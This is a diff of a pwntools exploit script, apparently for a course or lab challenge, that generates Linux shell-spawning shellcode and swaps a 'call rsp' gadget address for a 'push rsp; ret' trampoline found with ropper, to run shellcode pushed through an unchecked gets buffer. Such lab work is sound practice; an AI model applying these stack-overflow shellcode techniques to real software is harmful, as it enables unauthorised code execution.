@@ -39,19 +39,11 @@ if __name__ == "__main__":
     context.arch = "amd64"
     shellcode = shellcraft.amd64.linux.sh()
 
-
-    # # To solve this challenge, I start by looking at the lab2-2.c file.
-    # # The "void nothing_to_see_here()" function must be where the exploit is.
-    # # In "int main()", the gets instruction is used with a 128-byte buffer.
-    # # This is where I will push the shellcode onto the stack.
-
-    # # I take a look at the binary using ropper.
-    # # At 0x401259, there are the right bytes to "call rsp".
-    # # objdump confirms this address is within the "nothing_to_see_here" function.
-    # # Specifically, the hex is 0xd4ff.
-    # # I add this address as a variable for later use.
-
-    # call_rsp_address = 0x401259
+    # In order to execute my shellcode after I push it onto the stack, 
+    # I need to jump back to the stack.
+    # Using 'ropper -f lab2-3.bin -j rsp', I was able to locate the command 'push rsp, ret' in the victim code.
+    # The address of these instructions is 0x4013d6, so I save them for later use.
+    trampoline_address = 0x4013d6
 
     #### EXPLOITATION ####
     
